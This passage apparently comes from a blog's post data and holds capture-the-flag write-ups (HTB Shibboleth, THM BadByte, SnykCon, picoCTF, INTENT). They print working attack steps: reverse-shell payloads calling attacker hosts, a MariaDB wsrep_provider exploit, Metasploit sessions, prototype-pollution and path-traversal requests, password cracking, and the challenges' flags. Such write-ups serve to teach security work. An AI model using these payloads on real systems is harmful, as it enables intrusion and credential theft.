\\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/wordlists/subdomains/subdomain-1million.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200________________________________________________monitor [Status: 200, Size: 3686, Words: 192, Lines: 30]monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30]zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30]Voila!! we have some subdomains active , let’s add them to /etc/hosts└─$ sudo nano /etc/hosts#htb machines10.129.99.116 shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htbAll the three subdomain had a login pageHmmmmmm zabbix Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumptionGet login detailsSo I tried with some Web Attacks to login but none of them worked, The UDP port 623 will get us some hashesLearn The UDP port 623 is vulnerable : https://book.hacktricks.xyz/pentesting/623-udp-ipmiLogin creds I’ve used the Metasplot way to get the hashes because it was easymsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; use auxiliary/scanner/ipmi/ipmi_dumphashesmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.99.116rhosts =&gt; 10.129.99.116msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set OUTPUT_JOHN_FILE zabbixloginOUTPUT_JOHN_FILE =&gt; zabbixloginmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; exploit[+] 10.129.99.116:623 - IPMI - Hash found: Administrator:97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:84568da58ac1bb73a12d71bb0ea9d08a470ebd31[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; cat zabbixlogin[*] exec: cat zabbixlogin10.129.99.116 Administrator:$rakp$97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$84568da58ac1bb73a12d71bb0ea9d08a470ebd31 John cracked the password└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zabbixlogin Using default input encoding: UTF-8Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusilovepumkinpie1 (10.129.99.116 Administrator)1g 0:00:00:02 DONE (2021-11-15 10:10) 0.4201g/s 3139Kp/s 3139Kc/s 3139KC/s in_199..iargxeUse the \"--show\" option to display all of the cracked passwords reliablySession completed└─$ john zabbixlogin --show 10.129.99.116 Administrator:ilovepumkinpie11 password hash cracked, 0 left So now we have the creds [ Administrator : ilovepumkinpie1 ]Initial Foothold I researched for a bit and found this intresting https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents After moving around the website I figured out that ` add items ` was vulnerable The payload system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f sh -i 2&gt;&amp;1 nc 10.10.10.10 9999 &gt;/tmp/f &amp;,nowait] Set up a nc listener and get the shell└─$ nc -nvlp 9002listening on [any] 9002 ...connect to [10.10.14.47] from (UNKNOWN) [10.129.99.116] 40614sh: 0: can't access tty; job control turned off$ whoami zabbix As there were no SSH ports open we don’t get any stabalize shell, let’s get work with this shellGet User flag / escalting user privileges# Use the zabbix login creds to get ipmi-svc userzabbix@shibboleth$ su ipmi-svcpassword : ilovepumkinpie1ipmi-svc@shibboleth$ cat /home/ipmi-svc/user.txt&lt;--SNIP--&gt; Escalating privileges [ root ]linpeas.shroot 1279 0.0 0.0 2608 1856 ? S Nov13 0:00 /bin/sh /usr/bin/mysqld_saferoot 1431 0.7 3.7 1727148 150636 ? Sl Nov13 6:13 _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock Hmmm, MySQL is running as root, let’s enumerate So the DB information was stored in /etc/zabbix/zabbix_server.conf ipmi-svc@shibboleth:/etc$ cat /etc/zabbix/zabbix_server.conf | grep -C 2 -i \"password\"&lt;zabbix/zabbix_server.conf | grep -C 2 -i \"password\"DBUser=zabbix### Option: DBPassword#\tDatabase password.#\tComment this line if no password is used.## Mandatory: no# Default:DBPassword=bloooarskybluh Now we have the username and password [ zabbix : bloooarskybluh ]MySQL enumeration As ipmi-svc user was not in the sudoers list GTFO bins is not helpfulipmi-svc@shibboleth:/etc$ mysql -Vmysql -Vmysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 So the version is : 10.3.25 Link : https://www.cvedetails.com/vulnerability-list/vendor_id-12010/Mariadb.html The first CVE has 9.0 score [ CVE-2021-27928 ] Let’s get the root Link : https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.htmlFinal Step Create the reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf-so -o root.so I’ve used python http server and wget to download the payload python3 -m http.server 80 [ Attacker ] wget http:///root.so [ Victim ] Setup a nc listener # Login with creds we got earlier ipmi-svc@shibboleth:~$ mysql -u zabbix -pbloooarskybluh -h localhost -e 'SET GLOBAL wsrep_provider=\"/tmp/root.so\";'&lt;host -e 'SET GLOBAL wsrep_provider=\"/tmp/root.so\";'ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query## Rooted the machine └─$ nc -nvlp 4433 listening on [any] 4433 ...connect to [10.10.14.47] from (UNKNOWN) [10.129.99.153] 49958python3 -c \"import pty;pty.spawn('/bin/bash')\"root@shibboleth:/var/lib/mysql#iduid=0(root) gid=0(root) groups=0(root) root@shibboleth:/var/lib/mysql# cat /root/root.txt&lt;--SNIP--&gt;Box pwned" }, { "title": "TryHackMe BadByte", "url": "/posts/BadByte/", "categories": "THM", "tags": "THM", "date": "2022-01-10 16:00:00 +0530", "snippet": "Machine name : BadByteAn easy machine from tryhackme that covers basic port scanning, cracking ssh passwords, ssh port forwading, basic enumeration, reading log files and privilege escalationReconn...", "content": "Machine name : BadByteAn easy machine from tryhackme that covers basic port scanning, cracking ssh passwords, ssh port forwading, basic enumeration, reading log files and privilege escalationReconnaissance I’ve used rustscan for the scan└─$ rustscan -a 10.10.184.227 -- -sC -sV.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time ⌛[~] The config file is expected to be at \"/home/devcli3nt/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. Open 10.10.184.227:22Open 10.10.184.227:30024[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p \")PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl| 256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9QUKykbzCSI7+PgoVzHNKOVIWf+zm0LN/f4n0VJc/P0J9TzLImkYHIOCnRFpNUPtiWGXbHXi67FQxEpgZMReo=| 256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrvf1zJBhqU1RxUCYuTgoIy+7NzCqZeFWV67bt8+APV30024/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 1743 Mar 23 2021 id_rsa|_-rw-r--r-- 1 ftp ftp 78 Mar 23 2021 note.txt| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.9.2.60| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of statusService Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.21 secondsQuestions How many ports are open? 2 What service is running on the lowest open port? ssh What non-standard port is open? 30024 What service is running on the non-standard port? ftp Foothold Rustscan detected that anonymous login was enabled in FTP└─$ ftp 10.10.184.227 30024 Connected to 10.10.184.227.220 (vsFTPd 3.0.3)Name (10.10.184.227:devcli3nt): anonymous331 Please specify the password.Password:230 Login successful. Geting all the files [ mget* ]ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 1743 Mar 23 2021 id_rsa-rw-r--r-- 1 ftp ftp 78 Mar 23 2021 note.txt226 Directory send OK.ftp&gt; mget *mget id_rsa? y200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for id_rsa (1743 bytes).226 Transfer complete.1743 bytes received in 0.00 secs (23.7465 MB/s)mget note.txt? y200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for note.txt (78 bytes).226 Transfer complete.78 bytes received in 0.00 secs (1.5827 MB/s) Get username and password└─$ cat note.txt I always forget my password. Just let me store an ssh key here.- errorcauser└─$ locate ssh2john/usr/share/john/ssh2john.py └─$ /usr/share/john/ssh2john.py id_rsa &gt; hashfile └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashfile Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statuscupcake (id_rsa)Warning: Only 2 candidates left, minimum 4 needed for performance.1g 0:00:00:22 DONE (2022-01-27 09:02) 0.04522g/s 648652p/s 648652c/s 648652C/sa6_123..*7¡Vamos!Session completedQuestions What username do we find during the enumeration process? errorcauser What is the passphrase for the RSA private key? cupcake Port Forwarding Create a SSH port forward└─$ ssh -i id_rsa -D 1337 errorcauser@10.10.184.227 # After the connection change socks settings in proxychains └─$ sudo nano /etc/proxychains4.conf # socks5 127.0.0.1 1337 Now run proxychains and nmap to get internal ports information └─$ proxychains nmap -sT 127.0.0.1 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.15 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:29 IST [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:80 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:22 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:445 &lt;--socket error or timeout! [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:8080 &lt;--socket error or timeout! [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:3306 ... OK [proxychains] Strict chain ... 127.0.0.1:1337 ... 127.0.0.1:80 ... OK&lt;--SNIPPED--&gt; Now connect the internal ports via ssh└─$ ssh -L 80:127.0.0.1:80 errorcauser@10.10.184.227 -i id_rsa 130 ⨯Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64) &lt;--SNIPPED--&gt;Questions What main TCP ports are listening on localhost? 80,3306 What protocols are used for these ports? http,mysql Web Exploitation Scan port 80└─$ nmap -p 80 127.0.0.1 -sC -sVStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:41 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.00017s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.7|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: BadByte &amp;#8211; You&amp;#039;re looking at me, but they are lookin...Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds Enumeration└─$ nmap -p 80 --script http-wordpress-enum --script-args type=\"plugins\",search-limit=1500 127.0.0.1 1 ⚙Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:46 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.00017s latency).PORT STATE SERVICE80/tcp open http| http-wordpress-enum: | Search limited to top 1500 themes/plugins| plugins| duplicator 1.3.26|_ wp-file-manager 6.0Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds ABOUT DUPLICATOR VULN : https://www.exploit-db.com/exploits/50420 Duplicator is basically LFI 127.0.0.1/wp-admin/admin-ajax.php?action=duplicator_download&amp;file=../../../../../../../../etc/passwd User shellmsf6 &gt; use 0[*] Using configured payload php/meterpreter/reverse_tcpmsf6 exploit(multi/http/wp_file_manager_rce) &gt; set RHOSTS 127.0.0.1RHOSTS =&gt; 127.0.0.1msf6 exploit(multi/http/wp_file_manager_rce) &gt; set LHOST 10.9.2.60LHOST =&gt; 10.9.2.60msf6 exploit(multi/http/wp_file_manager_rce) &gt; run[*] Started reverse TCP handler on 10.9.2.60:4444 [*] Executing automatic check (disable AutoCheck to override)[+] The target appears to be vulnerable.[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/CMRdTO.php[*] Sending stage (39282 bytes) to 10.10.184.227[+] Deleted CMRdTO.php[*] Meterpreter session 1 opened (10.9.2.60:4444 -&gt; 10.10.184.227:58718) at 2021-05-03 19:42:28 +0200Questions What CMS is running on the machine? wordpress What is the CVE number for directory traversal vulnerability? CVE-2020-11738 What is the CVE number for remote code execution vulnerability? CVE-2020-25213 What is the name of user that was running CMS? cth -What is the user flag? THM{227906201d17d9c45aa93d0122ea1af7}Privilege Escalation The old password was stored in cat /var/log/bash.log : [ G00dP@$sw0rd2020 ] cth@badbyte:/home$ sudo -lsudo -l[sudo] password for cth: G00dP@$sw0rd2021Matching Defaults entries for cth on badbyte: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cth may run the following commands on badbyte: (ALL : ALL) ALLcth@badbyte:/home$ sudo -ssudo -sroot@badbyte:~# cat root.txtcat root.txt | ______ ________ ________ ______ _____________ __________ | | / ____ \\ / ___ \\ / ____ \\ / ____ \\ /____ ____// ______/\\ | | / /___/_/ / /__/ // / / /\\ / /___/_/ \\___/ /\\___/ /______\\/ | | / _____ \\ / ____ // / / / / / _____ \\ __ ___ / / / / ____/\\ | | / /____/ // / __/ // /___/ / / / /____/ // | / // / / / /____\\/ | | /________//__/ / /__//_________/ / /________/ | \\/ //___/ / / /________ | | \\________\\\\__\\/ \\__\\\\_________\\/ \\________\\ \\ / \\___\\/ /____________/\\ | | _________ __/ / / \\____________\\/ | | /________/\\ /_____/ / | | \\________\\/ \\_____\\/ |THM{ad485b44f63393b6a9225974909da5fa}Questions What is the user’s old password? G00dP@$sw0rd2020 What is the root flag? THM{ad485b44f63393b6a9225974909da5fa} " }, { "title": "SnykCon CTF 2021", "url": "/posts/SnykCon-CTF/", "categories": "CTF", "tags": "CTF", "date": "2021-12-31 01:30:00 +0530", "snippet": "SnykCon-CTF-2021 Category: Web Name: Invisible Ink Level: None Description: None Solution Overview the challenge provided us a Request and Response and POST method I used curl comman...", "content": "SnykCon-CTF-2021 Category: Web Name: Invisible Ink Level: None Description: None Solution Overview the challenge provided us a Request and Response and POST method I used curl command with POST method and seems nothing =)))) Now i read index.js file'use strict';const fs = require('fs');const express = require('express');const app = express();const bodyParser = require('body-parser');const _ = require('lodash');const options = {};const flag = fs.readFileSync('./flag', 'utf-8').trim();const docHtml = fs.readFileSync('./index.html', 'utf-8');app.use(bodyParser.json());app.get('/', (req, res) =&gt; { res.send(docHtml);});app.post('/echo', (reg, res) =&gt; { const out = { userID: req.headers['x-forwarded-for'] || req.connection.remoteAddress, time: Date.now() }; _.merge(out, req.body); if(options.flag){ out.flag = flag; }else { out.flag = 'disabled'; } res.json(out); process.exit(0);});app.listen(8000); I found two line of code const _ = require('lodash');,_.merge(out, req.body);,lodash is a lib of javascript you can read document about it at https://lodash.com/ :)) Then i found some exploit ways involved lodash and i found CVE-2018-3721. I realized the challenge have a problem about Prototype Pollution https://nvd.nist.gov/vuln/detail/CVE-2018-3721 I used curl command again and finally, i found a flag ^_^curl -H \"Content-Type: application/json\" -X POST http://35.211.53.53:8000/echo -d '{\"message\": \"ping\", \"__proto__\": {\"flag\":true}}' FLAG SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}" }, { "title": "PHP Deserialization Injection", "url": "/posts/PHP-Deserialization-Injection/", "categories": "CTF", "tags": "CTF", "date": "2021-12-25 01:30:00 +0530", "snippet": "PHP Deserialization Injection Name: Super Serial Category: Web Technique: PHP Deserialization Injection Hint: The flag is at ../flag Solution Overview the challenge have a login form In...", "content": "PHP Deserialization Injection Name: Super Serial Category: Web Technique: PHP Deserialization Injection Hint: The flag is at ../flag Solution Overview the challenge have a login form Initial reconnaissance The first i look at login form i think its sql injection but i used some payloads its response error, but name of the challenges Super Serial i gessing its Deserialization All challenges i solved always have attachment source code but this challenge must fuzzing found source code, i used dirsearch for fuzzing I found other pagesindex.phpcookie.phpauthentication.phpindex.phpcookie.phpauthentication.php I cant access this page i must add s because i access robots.txt its hint for me After i access other pages i found a source code Source Code Analysis index.phps&lt;?phprequire_once(\"cookie.php\");if(isset($_POST[\"user\"]) &amp;&amp; isset($_POST[\"pass\"])){\t$con = new SQLite3(\"../users.db\");\t$username = $_POST[\"user\"];\t$password = $_POST[\"pass\"];\t$perm_res = new permissions($username, $password);\tif ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) {\t\tsetcookie(\"login\", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), \"/\");\t\theader(\"Location: authentication.php\");\t\tdie();\t} else {\t\t$msg = '&lt;h6 class=\"text-center\" style=\"color:red\"&gt;Invalid Login.&lt;/h6&gt;';\t}}?&gt; user and pass used POST method username and password assign variable $perm_res for authenticate if $perm_res-&gt;is_guest() and $perm_res-&gt;is_admin() are true cookie will create header Location set value equal authentication.php then its direct from login page to welcome page setcookie login its created by serialize $perm_res variable then ` base64 and urlencode` cookie.phps&lt;?phpsession_start();class permissions{\tpublic $username;\tpublic $password;\tfunction __construct($u, $p) {\t\t$this-&gt;username = $u;\t\t$this-&gt;password = $p;\t}\tfunction __toString() {\t\treturn $u.$p;\t}\tfunction is_guest() {\t\t$guest = false;\t\t$con = new SQLite3(\"../users.db\");\t\t$username = $this-&gt;username;\t\t$password = $this-&gt;password;\t\t$stm = $con-&gt;prepare(\"SELECT admin, username FROM users WHERE username=? AND password=?\");\t\t$stm-&gt;bindValue(1, $username, SQLITE3_TEXT);\t\t$stm-&gt;bindValue(2, $password, SQLITE3_TEXT);\t\t$res = $stm-&gt;execute();\t\t$rest = $res-&gt;fetchArray();\t\tif($rest[\"username\"]) {\t\t\tif ($rest[\"admin\"] != 1) {\t\t\t\t$guest = true;\t\t\t}\t\t}\t\treturn $guest;\t} function is_admin() { $admin = false; $con = new SQLite3(\"../users.db\"); $username = $this-&gt;username; $password = $this-&gt;password; $stm = $con-&gt;prepare(\"SELECT admin, username FROM users WHERE username=? AND password=?\"); $stm-&gt;bindValue(1, $username, SQLITE3_TEXT); $stm-&gt;bindValue(2, $password, SQLITE3_TEXT); $res = $stm-&gt;execute(); $rest = $res-&gt;fetchArray(); if($rest[\"username\"]) { if ($rest[\"admin\"] == 1) { $admin = true; } } return $admin; }}if(isset($_COOKIE[\"login\"])){\ttry{\t\t$perm = unserialize(base64_decode(urldecode($_COOKIE[\"login\"])));\t\t$g = $perm-&gt;is_guest();\t\t$a = $perm-&gt;is_admin();\t}\tcatch(Error $e){\t\tdie(\"Deserialization error. \".$perm);\t}}?&gt; The function is_admin() and ` is_guest() are same check attribute username and password of permission class by query to database users.db because 2 function used prepared statements and parameterized queries` so exploit sql injection is impossiable IF block code check cookie of login if serialize true its response flag and false its response message Deserialization error authentication.phps &lt;?phpclass access_log{\tpublic $log_file;\tfunction __construct($lf) {\t\t$this-&gt;log_file = $lf;\t}\tfunction __toString() {\t\treturn $this-&gt;read_log();\t}\tfunction append_to_log($data) {\t\tfile_put_contents($this-&gt;log_file, $data, FILE_APPEND);\t}\tfunction read_log() {\t\treturn file_get_contents($this-&gt;log_file);\t}}require_once(\"cookie.php\");if(isset($perm) &amp;&amp; $perm-&gt;is_admin()){\t$msg = \"Welcome admin\";\t$log = new access_log(\"access.log\");\t$log-&gt;append_to_log(\"Logged in at \".date(\"Y-m-d\").\"\\n\");} else {\t$msg = \"Welcome guest\";}?&gt; Class access_log have 2 magic methods __construct and __toString. Method __toString response read_log(), read_log() will response content of file and transmisson ` constructor of access_log class via file_get_contents + Magic method wil execute when class create, therefore i created an object access_log`&lt;?phpclass access_log {\tpublic $log_file;}$object = new access_log;$object-&gt;log_file = \"../flag\";$serializedObject = serialize($object);echo $serializedObject;?&gt; The script when i run O:10:\"access_log\":1:{s:8:\"log_file\";s:7:\"../flag\";} After that i encode payload above to base64TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 I change name and value of cookies Finally i found a flag =))) FLAG picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}" }, { "title": "INTENT CTF 2021", "url": "/posts/INTENT-CTF/", "categories": "CTF", "tags": "CTF", "date": "2021-11-25 01:30:00 +0530", "snippet": "INTENT-CTF-2021 Category: Web Name: Careers Level: None Technique: ZIP Symlink Vulnerability Description: We got hacked,We’re trying to indentify the ROOT cause.If you are a l33t h4x0r, please...", "content": "INTENT-CTF-2021 Category: Web Name: Careers Level: None Technique: ZIP Symlink Vulnerability Description: We got hacked,We’re trying to indentify the ROOT cause.If you are a l33t h4x0r, please upload your resume.Solution Overview challenge provided a main page and careers.php page I think website can upload reverse shell but i read details a title only accepted zip format =)))) So i create a payload zip file and upload to website after upload it’s generated a ID And i clicked to ID it’s show zip.txt and now i used curl command to get flag =))) FLAG INTENT{zipfiles_are_awsome_for_pt} Etulosba Level: None Technique: LFI - Local File Inclusion, Path Traversal Description: Our spy managed to steal the source code for the Etulosba CDN. We need your help to get the flag from that server. Solution Source Code Analysis The challenge included source code main.jsconst fs = require(\"fs\");const path = require(\"path\");const express = require(\"express\");const server = express();server.get(\"/\", function (req, res) { res.end(\"&lt;html&gt;&lt;body&gt;etulosba&lt;/body&gt;&lt;/html&gt;\");});server.get(\"/files/images/:name\", function (req, res) { if (req.params.name.indexOf(\".\") === -1) { return res.status(400).json({ error: \"invalid file name\" }); } res.sendFile(__dirname + path.join(\"/files/images/\", req.params.name));});server.get(\"/files/binary/:name\", function (req, res) { if (req.params.name.indexOf(\".\") !== -1) { return res.status(400).json({ error: \"invalid file name\" }); } res.sendFile(path.resolve(__dirname, \"/files/binary/\", req.params.name));});fs.writeFileSync(path.join(__dirname, \"flag.name\"), process.env.FLAG_NAME);fs.writeFileSync(path.join(\"/tmp\", process.env.FLAG_NAME), process.env.FLAG);server.listen(process.env.HTTP_PORT);server.get(\"/files/images/:name\", function (req, res) { if (req.params.name.indexOf(\".\") === -1) { return res.status(400).json({ error: \"invalid file name\" }); } res.sendFile(__dirname + path.join(\"/files/images/\", req.params.name));}); Looking at the code we can see there are request with get and go to /files/images:name but i notice name , it’s mean name what we want if input the name not exist it’s will show 400 status with error message error: \"invalid file name\". Contrary if input name is exist,it’s will return real file of it.server.get(\"/files/binary/:name\", function (req, res) { if (req.params.name.indexOf(\".\") !== -1) { return res.status(400).json({ error: \"invalid file name\" }); } res.sendFile(path.resolve(__dirname, \"/files/binary/\", req.params.name));}); This code similar above code but it different files/binary/:name, so if input filename is exist. It will return the file of it. path.resolve is absolute path.fs.writeFileSync(path.join(__dirname, \"flag.name\"), process.env.FLAG_NAME);fs.writeFileSync(path.join(\"/tmp\", process.env.FLAG_NAME), process.env.FLAG); flag.name and process.env.FLAG there are env of flag, path.join it concatenated the current directory.Attack I used Burp Suite send request + ‘/flag.name’ with GET medthod and server response Cannot GET /flag.name =)))) I try Path Traversal vulnerability with url encoded payload files/images/..%2f..%2fflag.name and server response file name imaflagimaflag i think it contain flag =))) , nice ^_^ /files/binary/:name is endpoint because path.resolve only accepted if you send absolute path let’s get flag i send payload /files/binary/%2ftmp%2fimaflagimaflag and server reponse flag =))) FLAG INTENT{absolutely_great_job_with_the_absolute_path}# Mass Notes Level: None Technique: LFI - Local File Inclusion Description: We know the flag is on the Mass Notes servers, can you get it for us? Solution Over view the challenge have a note you can input everything you want, first look i think trigger xss but no :)) I Ctrl + u view page source img.src = \"/avatar/\" + note._id + \".png\"; server create image png with node._id from note you created, /avatar/is a path + .png Attack I input some contents in note and submit, server response encoded in JSON in the browser url bar https://mass-notes.chal.intentsummit.org/note.html?note=%7B%22title%22%3A%22hacked%20by%20d4rkp0w4r%22%2C%22content%22%3A%22haha%22%2C%22avatar%22%3A%22default_1.png%22%2C%22_id%22%3A%226197afd9ccfc2f0f0fa4e9e5%22%2C%22__v%22%3A0%7D I conducted decode url https://mass-notes.chal.intentsummit.org/note.html?note={\"title\":\"hacked by d4rkp0w4r\",\"content\":\"haha\",\"avatar\":\"default_1.png\",\"_id\":\"6197afd9ccfc2f0f0fa4e9e5\",\"__v\":0} I think i finished solve this challenge i used curl command for get flag but no it’s error :)) $ curl -k https://mass-notes.chal.intentsummit.org/avatar/6197afd9ccfc2f0f0fa4e9e5.pngError: ENOENT: no such file or directory, open '/app/avatars/default_1.png' The error show try open file name default_1.png and didn’t found it. default path is /app/avatars so i need to get up two levels in path traversal. I used Burp Suite catch a request and insert ../../flag into \"avatar\":\"../../flag\" , server response new id I used curl again with new id.png and i have a flag ^_^ FLAG INTENT{d0nt_mass_with_ap1s}# Door (un)Locked Level: None Technique: HTTP Smuggling attacks CVE-2021-40346 Description: Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.Can you find the weak link? Solution In this challenge include main page and attachment ha.cfg global daemondefaults mode http timeout client 50000 timeout server 50000 timeout connect 50000frontend web bind *:8000 http-request deny if { path_beg /flag } http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ } default_backend websrvsbackend websrvs http-reuse always server srv1 flask:5000 Then i searching about attachment ha.cfg and i realized that is an haproxy configuration Source Code Analysis I focus on two line of code :)) http-request deny if { path_beg /flag }http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ } [+] Blocks any request starting with /flag [+] Blocks any request starting with ^.*/?flag/?.*$ , matches the regex We can guess that the flag is hidden behind the /flag endpoint. ### Attack I used https://regex101.com/ that explains the regex meaning Anything with word flag inside url will be blocked, even if we send a urlencoded payload, since it decodes before matching but used regex101 it’s piece of cake Well, . matches any character let’s bypass ^_^ I used Burp Suite send a payload /./%0a/../flag with Get method and server response flag :^) FLAG INTENT{Smuggl3_w1th_H4_Pr0xy} ———————————————————————————————————————————-# GraphiCS Level: None Technique: GraphQL Tool: https://github.com/nikitastupin/clairvoyance/ Description: What is your problem?How didn’t you approve my beautiful innovative page on your “precious” CTF?!It’s all done, maybe I can just add some graphics. Solution In this challenge only main page While i searching techniques about GraphQL i found a blog https://book.hacktricks.xyz/pentesting/pentesting-web/graphql explained a how to exploit GraphQL My target found a endpoint of web i use dirsearch found endpoint Well, I found endpoint of web https://graphics.chal.intentsummit.org/api/v1/ I used tool for get a payload {\"operationName\":\"ExampleQuery\",\"variables\":{},\"query\":\"query ExampleQuery { _secret { flag } }\\n\"} I used a command curl of endpoint web for get flag ^_^ curl -k --request POST \\--header 'content-type: application/json' \\--url 